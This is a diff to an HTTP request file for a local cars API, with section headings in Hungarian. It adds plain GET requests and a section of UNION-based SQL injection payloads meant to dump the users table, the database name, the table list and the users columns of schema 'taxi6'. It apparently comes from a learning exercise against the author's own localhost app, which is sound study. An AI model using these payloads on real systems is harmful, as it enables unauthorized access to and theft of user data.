@@ -1,3 +1,22 @@
 
-### get
+### get all cars
 get http://localhost:3000/cars
+
+
+### get car by id
+get http://localhost:3000/cars/12
+
+
+### sql injections
+### get users tábla információk
+get http://localhost:3000/cars/2 UNION SELECT *, '' FROM users
+
+### get mi az adatbázis neve
+get http://localhost:3000/cars/2  UNION SELECT database(), '','',''
+
+### get milyen táblák vannak
+get http://localhost:3000/cars/222  UNION select table_name, '','','' from information_schema.tables where table_schema='taxi6'
+
+### get milyen oszlopai vannak a users táblának
+get http://localhost:3000/cars/222 UNION select column_name,'', '','' from information_schema.columns where table_name='users' and table_schema='taxi6'
+
